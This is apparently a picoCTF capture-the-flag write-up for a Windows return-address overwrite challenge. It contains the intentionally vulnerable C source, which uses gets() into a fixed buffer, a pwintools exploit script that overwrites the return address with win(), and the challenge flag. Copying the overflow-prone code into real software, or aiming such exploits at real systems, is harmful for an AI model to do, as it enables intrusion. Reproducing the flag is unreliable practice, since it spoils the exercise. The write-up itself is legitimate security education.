# Wine

Very simple return overwrite with buffer overflow, but in Windows!

Source Code:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void win(){
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if running on picoCTF servers.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

void vuln()
{
  printf("Give me a string!\n");
  char buf[128];
  gets(buf);
}
 
int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);
  vuln();
  return 0;
}
```

Quite obviously, we have a buffer overflow in the method `vuln()`
Since this is running in Windows, we have to use a different tool
When you run GDB on the file, and disassemble win, we get an address of `0x401530`

Now, our biggest issue is getting some sort of pwn script to run on Windows.

From a quick google search, you can find a tool called pwintools, which is pwntools adapted for Windows.

After downloading, this is the final script.

```python
from pwintools import *

#con = Process("D:/Downloads/vuln.exe")
con = Remote("saturn.picoctf.net", 50285)

payload = ""
payload += "a" * 140
payload += p64(0x401530)
con.sendline(payload)
con.interactive()
```

This prints out the flag, then a bunch of segfault related things, but we have our flag!

Our flag is: `picoCTF{Un_v3rr3_d3_v1n_cdac4d01}`
